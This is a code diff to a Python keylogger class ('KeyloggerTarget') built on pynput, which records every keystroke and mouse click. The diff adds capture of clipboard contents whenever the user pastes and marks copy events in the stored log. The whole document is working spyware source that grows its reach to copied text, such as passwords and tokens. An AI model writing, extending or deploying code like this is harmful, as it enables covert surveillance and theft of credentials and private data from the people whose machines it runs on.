@@ -1,3 +1,4 @@
+import pyperclip
 from pynput import keyboard
 from pynput.mouse import Listener
 import time
@@ -194,6 +195,18 @@ class KeyloggerTarget:
         with Listener(on_click=self.on_click) as listening:
             self.kill_switch()
             listening.join()
+    
+    def copy_data(self):
+        self.richtige_liste.append(" (COPY (Strg+c)) ")
+
+    def append_paste(self):
+        data = f" ({pyperclip.paste()} | PASTE (Strg+v)) | "
+        self.richtige_liste.append(data)
+
+    def print_work(self, word):
+        print(f'Alphabetische Taste wurde gedrückt: {word} ')
+        self.richtige_liste += word
+        # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"
 
     def on_press(self, key):
         try:
@@ -203,15 +216,23 @@ class KeyloggerTarget:
                 if self.caps is True:
                     if key.char in other_charecters:
                         word = other_charecters[key.char]
-                        #Upper Characters from "1" to "0" because all this numbers are not charecters are not in pynput
+                        # Upper Characters from "1" to "0" because all this numbers are not charecters are not in pynput
                     else:
                         word = key.char.upper()
                 else:
                     word = key.char
 
-                print(f'Alphabetische Taste wurde gedrückt: {word} ')
-                self.richtige_liste += word
-                # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"
+                all_req_keys = {"": self.copy_data, "": self.append_paste}
+                for each_key in all_req_keys:
+                    if each_key == key.char:
+                        all_req_keys[each_key]()
+                try:
+                    asci_number = ord(word)
+                    if asci_number not in range(0, 32):
+                        self.print_work(word)
+
+                except TypeError:
+                    self.print_work(word)
 
                 print(self.richtige_liste)
             except TypeError:
